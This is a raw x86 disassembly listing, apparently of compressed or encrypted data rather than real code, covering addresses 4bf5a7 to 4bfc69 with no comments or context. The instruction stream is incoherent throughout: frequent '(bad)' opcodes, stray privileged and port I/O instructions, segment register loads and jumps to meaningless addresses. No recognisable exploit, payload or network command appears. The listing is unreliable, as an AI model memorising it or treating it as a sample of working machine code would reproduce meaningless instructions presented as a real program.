  4bf5a7:	fadd   DWORD PTR [ebx]
  4bf5a9:	push   eax
  4bf5aa:	push   edx
  4bf5ab:	(bad)  
  4bf5ac:	stos   DWORD PTR es:[edi],eax
  4bf5ad:	xor    dl,dl
  4bf5af:	mov    esi,0x2f558486
  4bf5b4:	aaa    
  4bf5b5:	and    eax,0x8c116053
  4bf5ba:	pop    edi
  4bf5bb:	add    edi,0xadc702fc
  4bf5c1:	cdq    
  4bf5c2:	push   esp
  4bf5c3:	data16 stc 
  4bf5c5:	and    DWORD PTR [esi+eax*1-0x6a96ba90],0xffffff8d
  4bf5cd:	or     esp,DWORD PTR [ebx+eiz*1]
  4bf5d0:	xor    DWORD PTR [edi],edi
  4bf5d2:	adc    al,0x41
  4bf5d4:	and    DWORD PTR [ecx-0x58],ebp
  4bf5d7:	fnsave [edx]
  4bf5d9:	pop    ebx
  4bf5da:	nop
  4bf5db:	out    dx,al
  4bf5dc:	xchg   BYTE PTR [eax-0x327bbce1],ah
  4bf5e2:	je     0x4bf601
  4bf5e4:	jg     0x4bf606
  4bf5e6:	scas   al,BYTE PTR es:[edi]
  4bf5e7:	rcl    DWORD PTR [ecx],cl
  4bf5e9:	or     ecx,ebx
  4bf5eb:	lods   eax,DWORD PTR ds:[si]
  4bf5ed:	cmp    al,0x7
  4bf5ef:	push   esi
  4bf5f0:	jmp    0xd5f1f13a
  4bf5f5:	mov    dh,0x9f
  4bf5f7:	call   FWORD PTR [ebp+0x19]
  4bf5fa:	mov    ebx,0x630e6bf0
  4bf5ff:	into   
  4bf600:	cdq    
  4bf601:	or     edx,edi
  4bf603:	jmp    0x4bf61d
  4bf605:	in     eax,0x5e
  4bf607:	jae    0x4bf661
  4bf609:	xor    DWORD PTR [ebx],esp
  4bf60b:	xor    eax,DWORD PTR [ebx+edi*1+0x76709aa5]
  4bf612:	adc    al,0xc1
  4bf614:	jg     0x4bf652
  4bf616:	pop    ebx
  4bf617:	mov    ss,WORD PTR [ebp+0x35]
  4bf61a:	mov    gs,WORD PTR [edi]
  4bf61c:	xchg   DWORD PTR [edi],eax
  4bf61e:	and    BYTE PTR [esi+0x38],dl
  4bf621:	mov    ss,WORD PTR [ebx+0x9]
  4bf624:	dec    edx
  4bf625:	pop    esi
  4bf626:	xor    BYTE PTR [esi-0x49f0a266],bh
  4bf62c:	mov    fs,WORD PTR [esi]
  4bf62e:	xor    bh,BYTE PTR [edi]
  4bf630:	jo     0x4bf5b5
  4bf632:	arpl   WORD PTR [ecx+0x42],dx
  4bf635:	sub    ebp,DWORD PTR [esi]
  4bf637:	stos   DWORD PTR es:[edi],eax
  4bf638:	push   edx
  4bf639:	or     al,0xb6
  4bf63b:	enter  0xfd51,0x73
  4bf63f:	sub    DWORD PTR [eax+0x41578201],edx
  4bf645:	xor    bl,BYTE PTR [ecx]
  4bf647:	ret    0x1962
  4bf64a:	jns    0x4bf5d8
  4bf64c:	xchg   DWORD PTR [ebx-0x5ba6a68f],eax
  4bf652:	or     BYTE PTR [edx+esi*1+0x39db3b1],bh
  4bf659:	jg     0x4bf60a
  4bf65b:	or     BYTE PTR [edx+0x2b040556],bl
  4bf661:	push   edi
  4bf662:	and    DWORD PTR [edx+edx*4],edi
  4bf665:	daa    
  4bf666:	adc    eax,0x1feb3279
  4bf66b:	lods   al,BYTE PTR ds:[esi]
  4bf66c:	cmp    bh,dh
  4bf66e:	pop    ss
  4bf66f:	stc    
  4bf670:	mov    esi,DWORD PTR [esi-0x55e0c735]
  4bf676:	gs xor eax,0xd4aec0d
  4bf67c:	xor    eax,0xad1c5045
  4bf681:	icebp  
  4bf682:	daa    
  4bf683:	inc    eax
  4bf684:	mov    ch,0xc5
  4bf686:	xchg   ch,cl
  4bf688:	sub    DWORD PTR [edi],ebp
  4bf68a:	retf   0x842a
  4bf68d:	mov    BYTE PTR [ebp+0x8515a3c],cl
  4bf693:	fisttp QWORD PTR [edx+0xb]
  4bf696:	jp     0x4bf69c
  4bf698:	sbb    al,0x53
  4bf69a:	jp     0x4bf66f
  4bf69c:	lock popa 
  4bf69e:	push   ecx
  4bf69f:	lea    ebp,[ecx-0xff5a05f]
  4bf6a5:	push   es
  4bf6a6:	icebp  
  4bf6a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bf6a8:	adc    al,0x7
  4bf6aa:	push   cs
  4bf6ab:	sbb    ebp,DWORD PTR [ebx]
  4bf6ad:	sbb    DWORD PTR [ebx],esi
  4bf6af:	and    eax,0x8b6429cc
  4bf6b4:	push   DWORD PTR [ecx+0x52]
  4bf6b7:	repnz and DWORD PTR [ebx+ecx*1],ebp
  4bf6bb:	imul   ebx,DWORD PTR [eax],0x1f
  4bf6be:	mov    eax,DWORD PTR [edi+0x14]
  4bf6c1:	nop
  4bf6c2:	jo     0x4bf646
  4bf6c4:	mov    dh,0xf7
  4bf6c6:	dec    edx
  4bf6c7:	add    al,BYTE PTR [edx]
  4bf6c9:	popa   
  4bf6ca:	sahf   
  4bf6cb:	mov    ebp,DWORD PTR [ebx-0x7b]
  4bf6ce:	jnp    0x4bf712
  4bf6d0:	shr    BYTE PTR [ebx],cl
  4bf6d2:	ss inc edx
  4bf6d4:	shr    DWORD PTR [esi+0x71],cl
  4bf6d7:	or     BYTE PTR [edx+0x14597b1b],ah
  4bf6dd:	push   ebx
  4bf6de:	push   edi
  4bf6df:	retf   
  4bf6e0:	pop    esp
  4bf6e1:	adc    edx,DWORD PTR [edi]
  4bf6e3:	inc    edx
  4bf6e4:	inc    ebp
  4bf6e5:	or     al,al
  4bf6e7:	sub    ebx,ebx
  4bf6e9:	inc    ecx
  4bf6ea:	add    BYTE PTR [edx],ah
  4bf6ec:	ds jge 0x4bf694
  4bf6ef:	or     DWORD PTR [edx-0x77],edx
  4bf6f2:	dec    edx
  4bf6f3:	xchg   esp,eax
  4bf6f4:	mov    dh,0x93
  4bf6f6:	outs   dx,BYTE PTR ds:[esi]
  4bf6f7:	int3   
  4bf6f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bf6f9:	mov    cl,0x8a
  4bf6fb:	out    dx,eax
  4bf6fc:	inc    ecx
  4bf6fd:	or     al,0x4d
  4bf6ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bf700:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bf701:	adc    DWORD PTR [esi],ecx
  4bf703:	or     ah,BYTE PTR [edi+esi*2-0x5391f9b6]
  4bf70a:	or     eax,0xb2693e55
  4bf70f:	test   BYTE PTR [ebx+0x57],bl
  4bf712:	pop    es
  4bf713:	jb     0x4bf727
  4bf715:	loope  0x4bf6f0
  4bf717:	clc    
  4bf718:	or     al,0x0
  4bf71a:	xlat   BYTE PTR ds:[ebx]
  4bf71b:	inc    eax
  4bf71c:	add    esi,DWORD PTR [esi+0x7ff3222]
  4bf722:	push   ebx
  4bf723:	push   ecx
  4bf724:	mov    ch,0xc4
  4bf726:	clc    
  4bf727:	fcmovnb st,st(6)
  4bf729:	adc    DWORD PTR [ebx-0xf],0xffffff87
  4bf72d:	xor    DWORD PTR [ecx],esp
  4bf72f:	adc    al,0x23
  4bf731:	test   DWORD PTR [ecx],eax
  4bf733:	imul   ebx,DWORD PTR [edx-0x7a17d4],0x44bfffa2
  4bf73d:	jge    0x4bf74a
  4bf73f:	(bad)  
  4bf740:	out    dx,eax
  4bf741:	push   ds
  4bf742:	ret    0xe36b
  4bf745:	loopne 0x4bf6ea
  4bf747:	cmp    DWORD PTR [eax],ecx
  4bf749:	nop
  4bf74a:	or     ebp,DWORD PTR [esi]
  4bf74c:	retf   0x4e0a
  4bf74f:	or     al,0x29
  4bf751:	jo     0x4bf6d5
  4bf753:	mov    al,ds:0x69d6850
  4bf758:	push   ss
  4bf759:	jp     0x4bf743
  4bf75b:	jmp    0x4bf6f9
  4bf75d:	nop
  4bf75e:	sub    al,0x43
  4bf760:	or     DWORD PTR [edx+0x6],edi
  4bf763:	cmp    BYTE PTR [eax-0x4b],bl
  4bf766:	mov    dh,0xf7
  4bf768:	sub    BYTE PTR [edi+eiz*1+0x8b6890b],0xc0
  4bf770:	in     eax,dx
  4bf771:	addr16 jo 0x4bf759
  4bf774:	sbb    BYTE PTR [edi+edi*8],0xb0
  4bf778:	adc    al,0xd
  4bf77a:	dec    edx
  4bf77b:	adc    ecx,esi
  4bf77d:	push   0x32
  4bf77f:	pop    es
  4bf780:	push   0xeb381c10
  4bf785:	mov    cl,0xe9
  4bf787:	fst    DWORD PTR [ebp-0x53e28e7c]
  4bf78d:	push   ss
  4bf78e:	in     eax,dx
  4bf78f:	sahf   
  4bf790:	push   ss
  4bf791:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4bf792:	retf   
  4bf793:	push   0x1
  4bf795:	ret    
  4bf796:	fwait
  4bf797:	xor    al,0x41
  4bf799:	xchg   BYTE PTR [edx],ah
  4bf79b:	ret    
  4bf79c:	fisubr DWORD PTR [eax+0x953511]
  4bf7a2:	inc    edx
  4bf7a3:	pop    ds
  4bf7a4:	or     al,0x27
  4bf7a6:	in     al,0xc2
  4bf7a8:	inc    ecx
  4bf7a9:	test   BYTE PTR [ecx+0x39],dl
  4bf7ac:	adc    DWORD PTR [ecx+0x34],edx
  4bf7af:	or     dh,BYTE PTR [edx+ebx*1+0x68a2ed57]
  4bf7b6:	push   ebp
  4bf7b7:	imul   edx,DWORD PTR [ebx+ebx*4+0x55],0x6fa14c00
  4bf7bf:	xchg   edi,eax
  4bf7c0:	div    DWORD PTR [edx]
  4bf7c2:	popf   
  4bf7c3:	lock int 0x89
  4bf7c6:	ror    DWORD PTR [edx],0xfc
  4bf7c9:	xchg   ebx,edi
  4bf7cb:	in     eax,dx
  4bf7cc:	add    DWORD PTR [edx+0x21db8db3],esp
  4bf7d2:	xor    al,0x14
  4bf7d4:	pushf  
  4bf7d5:	adc    BYTE PTR [di+0x6d],al
  4bf7d9:	punpckhdq mm5,QWORD PTR [ecx-0x15]
  4bf7dd:	sub    eax,0xe14818f
  4bf7e2:	jecxz  0x4bf7fc
  4bf7e4:	test   DWORD PTR [ebp+ecx*1+0x7cb592a],ecx
  4bf7eb:	jns    0x4bf827
  4bf7ed:	add    BYTE PTR [ecx-0x75],0xc5
  4bf7f1:	imul   ebp,DWORD PTR [eax],0x5e
  4bf7f4:	mov    eax,ds:0x9509e22d
  4bf7f9:	fwait
  4bf7fa:	and    ebx,eax
  4bf7fc:	push   ebp
  4bf7fd:	enter  0xbbed,0x57
  4bf801:	aaa    
  4bf802:	popa   
  4bf803:	or     eax,0x845d0c9a
  4bf808:	test   DWORD PTR [esp+esi*2+0x35031c7e],esi
  4bf80f:	pop    ebp
  4bf810:	sub    BYTE PTR [edx+0x7d8d429e],0x27
  4bf817:	push   0x742e10fd
  4bf81c:	sbb    BYTE PTR [edi+0x3003f180],al
  4bf822:	push   ebx
  4bf823:	add    DWORD PTR [edi+0x2c29b647],0x7d
  4bf82a:	xor    ebx,DWORD PTR [eax]
  4bf82c:	icebp  
  4bf82d:	push   edx
  4bf82e:	add    edx,DWORD PTR cs:[eax-0x49]
  4bf832:	add    eax,eax
  4bf834:	inc    eax
  4bf835:	pop    ebx
  4bf836:	sbb    DWORD PTR [edx+eiz*1+0x2e],edx
  4bf83a:	mov    eax,ds:0x8108cb99
  4bf83f:	inc    eax
  4bf840:	and    BYTE PTR [ebp-0x77],al
  4bf843:	mov    ds:0x12654376,al
  4bf848:	xchg   BYTE PTR [edx-0x21],dl
  4bf84b:	pop    edi
  4bf84c:	je     0x4bf869
  4bf84e:	cmp    DWORD PTR [eax+0x8],edi
  4bf851:	call   0xa050e3e7
  4bf856:	(bad)  
  4bf857:	aas    
  4bf858:	hlt    
  4bf859:	(bad)  
  4bf85a:	clc    
  4bf85b:	ja     0x4bf88d
  4bf85d:	lock mov DWORD PTR [edx+0x6a],esi
  4bf861:	ins    BYTE PTR es:[edi],dx
  4bf862:	adc    al,0x2
  4bf864:	lock ds push ecx
  4bf867:	pop    esp
  4bf868:	add    al,0x56
  4bf86a:	retf   
  4bf86b:	adc    BYTE PTR [esi-0x14147a7f],bh
  4bf871:	call   0xbb6c:0xb1e0e145
  4bf878:	lds    esp,FWORD PTR [esi+eax*1+0x1a65a8c6]
  4bf87f:	xchg   ebx,eax
  4bf880:	inc    edx
  4bf881:	fdivr  DWORD PTR [esi]
  4bf883:	push   esi
  4bf884:	ins    BYTE PTR es:[edi],dx
  4bf885:	and    BYTE PTR [eax],dl
  4bf887:	push   esi
  4bf888:	nop
  4bf889:	xchg   esi,eax
  4bf88a:	mov    dl,0xad
  4bf88c:	ror    BYTE PTR [esi],1
  4bf88e:	enter  0x334a,0x18
  4bf892:	jne    0x4bf896
  4bf894:	dec    eax
  4bf895:	mov    bl,0x95
  4bf897:	fcom   DWORD PTR [ecx]
  4bf899:	fsub   DWORD PTR [eax]
  4bf89b:	mov    dl,ah
  4bf89d:	adc    BYTE PTR [eax+0x3c],bl
  4bf8a0:	dec    edx
  4bf8a1:	cmp    BYTE PTR [esi+ebx*8],al
  4bf8a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bf8a5:	mov    bl,0x1
  4bf8a7:	jbe    0x4bf8da
  4bf8a9:	inc    edi
  4bf8aa:	add    al,0x58
  4bf8ac:	jne    0x4bf8d9
  4bf8ae:	mov    dh,0xc2
  4bf8b0:	hlt    
  4bf8b1:	push   cs
  4bf8b2:	push   ecx
  4bf8b3:	int    0x71
  4bf8b5:	ins    DWORD PTR es:[edi],dx
  4bf8b6:	dec    ebp
  4bf8b7:	sub    BYTE PTR [ebp+0x63f5db32],ch
  4bf8bd:	and    al,0x80
  4bf8bf:	xlat   BYTE PTR ds:[ebx]
  4bf8c0:	adc    BYTE PTR [edx-0x5b],ah
  4bf8c3:	push   esi
  4bf8c4:	popa   
  4bf8c5:	les    eax,FWORD PTR [ecx]
  4bf8c7:	cmp    BYTE PTR [ecx-0x22],ah
  4bf8ca:	add    esp,ebx
  4bf8cc:	adc    al,0xa6
  4bf8ce:	ja     0x4bf869
  4bf8d0:	cs out 0x9,al
  4bf8d3:	test   BYTE PTR [ebp+ebp*8-0x766227d0],cl
  4bf8da:	int    0x78
  4bf8dc:	iret   
  4bf8dd:	mov    BYTE PTR [ecx+edi*8-0x755be4f7],ah
  4bf8e4:	add    ecx,DWORD PTR [ecx]
  4bf8e6:	dec    ebx
  4bf8e7:	leave  
  4bf8e8:	adc    bl,BYTE PTR [esi-0x72]
  4bf8eb:	sbb    al,dl
  4bf8ed:	pop    ss
  4bf8ee:	add    BYTE PTR gs:[eax+0x6960f02],al
  4bf8f5:	out    dx,eax
  4bf8f6:	jmp    0x4bf8bb
  4bf8f8:	xor    al,0x11
  4bf8fa:	xor    al,0x56
  4bf8fc:	mov    eax,DWORD PTR ds:0x6b28e8e1
  4bf902:	and    eax,esp
  4bf904:	sahf   
  4bf905:	inc    ecx
  4bf906:	adc    ebx,DWORD PTR [ebp+0x45]
  4bf909:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bf90a:	je     0x4bf97c
  4bf90c:	test   edx,esi
  4bf90e:	aam    0x2b
  4bf910:	jmp    0x4bf934
  4bf912:	xor    eax,0x4e96d9e7
  4bf917:	ror    DWORD PTR [edi],0x74
  4bf91a:	adc    cl,BYTE PTR ds:0xa5c16dea
  4bf920:	loopne 0x4bf919
  4bf922:	(bad)  
  4bf923:	jo     0x4bf975
  4bf925:	dec    esp
  4bf926:	fild   DWORD PTR [edi-0x1acac3d5]
  4bf92c:	or     eax,DWORD PTR [eax-0x367a80ff]
  4bf932:	jl     0x4bf94b
  4bf934:	jg     0x4bf940
  4bf936:	and    esi,0x4f416ba2
  4bf93c:	ins    DWORD PTR es:[edi],dx
  4bf93d:	or     eax,DWORD PTR [ebx+ecx*1]
  4bf940:	ror    DWORD PTR [esi-0x73],0xb7
  4bf944:	jne    0x4bf99f
  4bf946:	xchg   esp,eax
  4bf947:	mov    WORD PTR [edx+0x7c1120f9],ds
  4bf94d:	aaa    
  4bf94e:	or     al,0x1b
  4bf950:	sbb    edi,DWORD PTR [esi+0xb738072]
  4bf956:	mov    ah,0x65
  4bf958:	dec    ebp
  4bf959:	dec    esp
  4bf95a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bf95b:	push   edi
  4bf95c:	arpl   WORD PTR [esi+eax*2+0x43],bx
  4bf960:	cld    
  4bf961:	ja     0x4bf8e7
  4bf963:	outs   dx,DWORD PTR ds:[esi]
  4bf964:	adc    BYTE PTR [ebp-0x59],bh
  4bf967:	lock mov BYTE PTR [ecx],ch
  4bf96a:	mov    eax,ds:0x303b6a9a
  4bf96f:	dec    ecx
  4bf970:	pop    edi
  4bf971:	test   dh,al
  4bf973:	push   ebx
  4bf974:	xchg   ebp,eax
  4bf975:	sub    eax,0x5b5c2611
  4bf97a:	mov    DWORD PTR [eax-0x80],ebp
  4bf97d:	adc    DWORD PTR [ecx+0x43],edx
  4bf980:	sub    eax,0xd02ed3a
  4bf985:	clc    
  4bf986:	(bad)  
  4bf987:	mov    edi,DWORD PTR [ecx-0x7e16aae3]
  4bf98d:	xchg   edi,eax
  4bf98e:	add    ah,ah
  4bf990:	jb     0x4bf9cb
  4bf992:	mov    ch,0x10
  4bf994:	loopne 0x4bfa01
  4bf996:	sub    DWORD PTR [ecx-0x1f],ecx
  4bf999:	mov    ss,ecx
  4bf99b:	add    DWORD PTR [eax],esp
  4bf99d:	add    BYTE PTR [edx-0x795be0f1],al
  4bf9a3:	mov    al,ds:0xc6cdccf2
  4bf9a8:	push   esi
  4bf9a9:	pop    edi
  4bf9aa:	and    eax,0xf6ac086
  4bf9af:	pop    eax
  4bf9b0:	jecxz  0x4bfa05
  4bf9b2:	mov    ecx,0xdf083c2a
  4bf9b7:	mov    edi,0x27821a34
  4bf9bc:	sbb    eax,0x146c57d9
  4bf9c1:	dec    ebx
  4bf9c2:	xor    BYTE PTR [edx-0x72f5effe],cl
  4bf9c8:	jae    0x4bfa38
  4bf9ca:	inc    eax
  4bf9cb:	popa   
  4bf9cc:	(bad)  
  4bf9cd:	outs   dx,DWORD PTR ds:[esi]
  4bf9ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bf9cf:	dec    esp
  4bf9d0:	scas   al,BYTE PTR es:[edi]
  4bf9d1:	add    al,0x9f
  4bf9d4:	adc    BYTE PTR ds:0xb6634602,dl
  4bf9da:	cwde   
  4bf9db:	loope  0x4bf989
  4bf9dd:	adc    al,0x9
  4bf9df:	js     0x4bf9dc
  4bf9e1:	mov    esp,0x6bb3084
  4bf9e6:	dec    ebx
  4bf9e7:	shl    BYTE PTR [ebx+0x27e06f29],cl
  4bf9ed:	add    DWORD PTR [esi+edx*4],esi
  4bf9f0:	call   FWORD PTR [edi-0x9]
  4bf9f3:	retf   
  4bf9f4:	(bad)  
  4bf9f5:	out    0x9,eax
  4bf9f7:	jmp    DWORD PTR [edx+esi*2]
  4bf9fa:	out    dx,eax
  4bf9fb:	jns    0x4bf992
  4bf9fd:	popa   
  4bf9fe:	shl    bh,1
  4bfa00:	mov    bl,0xbd
  4bfa02:	xchg   edx,eax
  4bfa03:	adc    BYTE PTR [eax-0x28],ch
  4bfa06:	leave  
  4bfa07:	test   DWORD PTR [eax+eiz*4],0x44571b03
  4bfa0e:	mov    edi,eax
  4bfa10:	retf   0x3438
  4bfa13:	dec    edx
  4bfa14:	addr16 jmp 0x4bfa5c
  4bfa17:	clc    
  4bfa18:	ret    0xbc81
  4bfa1b:	mov    edx,0xc7fc6810
  4bfa20:	push   ebp
  4bfa21:	xlat   BYTE PTR ds:[ebx]
  4bfa22:	mov    al,bh
  4bfa24:	sub    BYTE PTR [ecx],ah
  4bfa26:	xchg   esi,eax
  4bfa27:	out    0x6,eax
  4bfa29:	mov    BYTE PTR ds:0x2fde129c,dh
  4bfa2f:	ss jne 0x4bfa46
  4bfa32:	xlat   BYTE PTR ds:[ebx]
  4bfa33:	ja     0x4bfa35
  4bfa35:	test   DWORD PTR [ecx],ebx
  4bfa37:	pop    edx
  4bfa38:	and    DWORD PTR [ebp+0x8],edx
  4bfa3b:	or     DWORD PTR [ebx+0x5c4335e9],ebp
  4bfa41:	enter  0x3783,0xf4
  4bfa45:	pop    ss
  4bfa46:	pop    es
  4bfa47:	mov    edi,0xd43480f1
  4bfa4c:	add    ah,dh
  4bfa4e:	jmp    0x4bf9e3
  4bfa50:	add    ch,BYTE PTR [eax+0x8]
  4bfa53:	pop    ds
  4bfa54:	adc    ah,BYTE PTR [ecx-0x7ece3558]
  4bfa5a:	adc    ah,bl
  4bfa5c:	and    BYTE PTR [ebx+ebp*2],al
  4bfa5f:	push   ebp
  4bfa60:	push   eax
  4bfa61:	xor    cl,BYTE PTR [eax+ecx*8+0x7]
  4bfa65:	scas   eax,DWORD PTR es:[edi]
  4bfa66:	push   eax
  4bfa67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4bfa68:	clc    
  4bfa69:	xchg   ecx,eax
  4bfa6a:	sbb    dl,cl
  4bfa6c:	sbb    al,cl
  4bfa6e:	or     esp,DWORD PTR [ecx]
  4bfa70:	add    BYTE PTR [esi-0x28e4c959],0x22
  4bfa77:	adc    esi,edx
  4bfa79:	enter  0x18c8,0x5b
  4bfa7d:	push   cs
  4bfa7e:	cdq    
  4bfa7f:	nop
  4bfa80:	bt     ebp,0xbb
  4bfa84:	neg    BYTE PTR ds:0x282ec818
  4bfa8a:	arpl   WORD PTR [ebx+0x2cc82b30],si
  4bfa90:	arpl   WORD PTR [edi+0x45],si
  4bfa93:	imul   ecx,DWORD PTR [edx-0x17c3ea1c],0xffffffac
  4bfa9a:	popa   
  4bfa9b:	sbb    bx,sp
  4bfa9e:	cmp    bh,bh
  4bfaa0:	add    al,0x82
  4bfaa2:	scas   eax,DWORD PTR es:[edi]
  4bfaa3:	enter  0x2b85,0x8b
  4bfaa7:	scas   eax,DWORD PTR es:[edi]
  4bfaa8:	enter  0xd58b,0x6
  4bfaac:	mov    cl,0x81
  4bfaae:	push   edi
  4bfaaf:	call   0x5cd4267f
  4bfab4:	sbb    BYTE PTR [ebp-0x78],ah
  4bfab7:	mov    edx,0x7c94387
  4bfabc:	rcr    DWORD PTR [eax+0x1d608b7f],0xb1
  4bfac3:	pop    esp
  4bfac4:	enter  0xc183,0x8
  4bfac8:	or     eax,0x6ea20375
  4bfacd:	cmp    BYTE PTR [ebp+0x29],al
  4bfad0:	in     eax,dx
  4bfad1:	xor    eax,DWORD PTR [eax+0x9]
  4bfad4:	cmp    DWORD PTR [ecx+esi*1+0x61],edx
  4bfad8:	enter  0x79c8,0x97
  4bfadc:	seta   BYTE PTR [ebx]
  4bfadf:	retf   
  4bfae0:	call   0x41308191
  4bfae5:	push   edx
  4bfae6:	nop
  4bfae7:	pop    ds
  4bfae8:	xchg   esi,eax
  4bfae9:	and    ebx,DWORD PTR [edi+0x5dc90473]
  4bfaef:	mov    al,ds:0x8b339e6d
  4bfaf4:	jg     0x4bfb45
  4bfaf6:	adc    al,0xa
  4bfaf8:	adc    ch,bh
  4bfafa:	hlt    
  4bfafb:	ret    
  4bfafc:	sub    ch,BYTE PTR [ecx+edx*8-0x13]
  4bfb00:	adc    BYTE PTR [eax],dh
  4bfb02:	mov    ecx,0x5fb06b74
  4bfb07:	xchg   ecx,eax
  4bfb08:	jmp    0x4bfb1e
  4bfb0a:	stc    
  4bfb0b:	mov    cl,0xc
  4bfb0d:	ins    DWORD PTR es:[edi],dx
  4bfb0e:	rol    DWORD PTR [ebx+0x749b3881],cl
  4bfb14:	or     BYTE PTR [ebx],0x47
  4bfb17:	repz lea eax,[eax-0x7e]
  4bfb1b:	shl    DWORD PTR [ebp+0x59],cl
  4bfb1e:	pusha  
  4bfb1f:	mov    dl,0xb3
  4bfb21:	push   es
  4bfb22:	adc    al,0x6f
  4bfb24:	push   esp
  4bfb25:	jecxz  0x4bfaf4
  4bfb27:	xchg   DWORD PTR [ebx],ebx
  4bfb29:	rol    BYTE PTR [ebp+0x1150fbdc],0x9e
  4bfb30:	idiv   BYTE PTR [di+0x5f]
  4bfb34:	lods   eax,DWORD PTR ds:[esi]
  4bfb35:	out    0x4d,eax
  4bfb37:	dec    esp
  4bfb38:	fs push ecx
  4bfb3a:	cld    
  4bfb3b:	mov    al,0xe4
  4bfb3d:	dec    eax
  4bfb3e:	add    BYTE PTR [ebx-0x68],ch
  4bfb41:	jg     0x4bfb45
  4bfb43:	test   eax,0x772d84c0
  4bfb48:	popa   
  4bfb49:	add    DWORD PTR [edi],0x90c30bc9
  4bfb4f:	jo     0x4bfbb9
  4bfb51:	inc    ebx
  4bfb52:	push   esp
  4bfb53:	bnd ret 
  4bfb55:	mov    eax,0x21c97c85
  4bfb5a:	push   ebx
  4bfb5b:	lock aam 0xf1
  4bfb5e:	add    al,0x4d
  4bfb60:	mov    dl,0x63
  4bfb62:	cwde   
  4bfb63:	rcr    DWORD PTR [esi+esi*4],1
  4bfb66:	ja     0x4bfb95
  4bfb68:	mov    cl,0xc7
  4bfb6a:	xor    eax,edi
  4bfb6c:	in     eax,dx
  4bfb6d:	sub    BYTE PTR [edx-0x37],0x0
  4bfb71:	lods   eax,DWORD PTR ds:[esi]
  4bfb72:	xor    eax,0x17006385
  4bfb77:	outs   dx,DWORD PTR ds:[esi]
  4bfb78:	push   0x8
  4bfb7a:	or     DWORD PTR [edi-0x1c],0xffffff85
  4bfb7e:	and    ebp,DWORD PTR [eax+0x4f0f7a5f]
  4bfb84:	jecxz  0x4bfbc8
  4bfb86:	cmp    ah,BYTE PTR [ecx+esi*1+0x381031ac]
  4bfb8d:	add    BYTE PTR [ebp+ecx*1+0x280a9d91],cl
  4bfb94:	ins    BYTE PTR es:[edi],dx
  4bfb95:	mov    DWORD PTR [ebp+esi*4-0x69],ecx
  4bfb99:	jmp    0x4bfbeb
  4bfb9b:	inc    ebx
  4bfb9c:	xor    ah,BYTE PTR [ecx]
  4bfb9e:	pop    edi
  4bfb9f:	mov    eax,0x560415c9
  4bfba5:	add    eax,0xe04bf0a6
  4bfbaa:	jmp    0x4bfbd1
  4bfbac:	pop    ebp
  4bfbad:	lods   eax,DWORD PTR ds:[esi]
  4bfbae:	sub    al,BYTE PTR [ecx]
  4bfbb0:	add    eax,0x927a8135
  4bfbb5:	add    al,0x53
  4bfbb7:	js     0x4bfbe3
  4bfbb9:	sbb    DWORD PTR [edx],0x46710a69
  4bfbbf:	mov    al,ds:0x493c3830
  4bfbc4:	mov    WORD PTR [ebx],cs
  4bfbc6:	mov    eax,0xc5aa2f29
  4bfbcb:	add    eax,0xe533303c
  4bfbd0:	mov    DWORD PTR [edi],ecx
  4bfbd2:	mov    eax,ds:0x46bb156a
  4bfbd7:	scas   al,BYTE PTR es:[edi]
  4bfbd8:	mov    esi,0x3372b569
  4bfbdd:	pop    ds
  4bfbde:	xor    BYTE PTR [ebx-0x3fa1bcfb],bh
  4bfbe4:	xchg   ebp,eax
  4bfbe5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bfbe6:	mov    cl,0x15
  4bfbe8:	nop
  4bfbe9:	(bad)  
  4bfbeb:	or     al,BYTE PTR [edx-0x2b]
  4bfbee:	pop    ds
  4bfbef:	sub    dh,dl
  4bfbf1:	cmp    DWORD PTR [edx+0x46],ebx
  4bfbf4:	in     al,dx
  4bfbf5:	push   ebp
  4bfbf6:	stos   DWORD PTR es:[edi],eax
  4bfbf7:	mov    al,ds:0xf67d6d16
  4bfbfc:	dec    eax
  4bfbfd:	stos   BYTE PTR es:[edi],al
  4bfbfe:	and    eax,0x4c5425cf
  4bfc03:	stos   DWORD PTR es:[edi],eax
  4bfc04:	lds    eax,FWORD PTR [esp+ebp*8-0x395f7450]
  4bfc0b:	daa    
  4bfc0c:	icebp  
  4bfc0d:	rcr    BYTE PTR [ebp+0x48],cl
  4bfc10:	mov    al,0x53
  4bfc12:	bound  esi,QWORD PTR [esi-0x20]
  4bfc15:	ror    BYTE PTR [edx+0x1f],0x6f
  4bfc19:	sbb    al,BYTE PTR [ebp+eiz*2+0x41]
  4bfc1d:	scas   al,BYTE PTR es:[edi]
  4bfc1e:	mov    ch,0x29
  4bfc20:	jae    0x4bfc1f
  4bfc22:	dec    ebp
  4bfc23:	enter  0xc6b4,0x8
  4bfc27:	jns    0x4bfc73
  4bfc29:	jmp    0x4bfbec
  4bfc2b:	popa   
  4bfc2c:	(bad)  
  4bfc2d:	jae    0x4bfc5a
  4bfc2f:	push   ecx
  4bfc30:	inc    ecx
  4bfc31:	adc    DWORD PTR [edx],edx
  4bfc33:	sbb    al,0xa4
  4bfc35:	sub    eax,0x4e4efbe4
  4bfc3a:	jmp    0x4bfc95
  4bfc3c:	cmc    
  4bfc3d:	fdivr  DWORD PTR [esi]
  4bfc3f:	add    DWORD PTR [ebx-0x46],eax
  4bfc42:	nop
  4bfc43:	out    dx,eax
  4bfc44:	cmp    DWORD PTR [ebx-0x26c1b614],edi
  4bfc4a:	fdivr  DWORD PTR [ecx-0x73]
  4bfc4d:	lds    ebx,FWORD PTR [ecx-0x2d]
  4bfc50:	jo     0x4bfc6b
  4bfc52:	add    edx,DWORD PTR [edx+ebp*1-0x7ec0fcba]
  4bfc59:	cmp    DWORD PTR [ebx],edx
  4bfc5b:	inc    esi
  4bfc5c:	xchg   edi,eax
  4bfc5d:	(bad)  
  4bfc5e:	leave  
  4bfc5f:	add    al,0xc7
  4bfc61:	loope  0x4bfc05
  4bfc63:	mov    ebp,0xb6fd1303
  4bfc68:	cdq    
  4bfc69:	xor    bh,BYTE PTR [eax+0x5b07c84d]
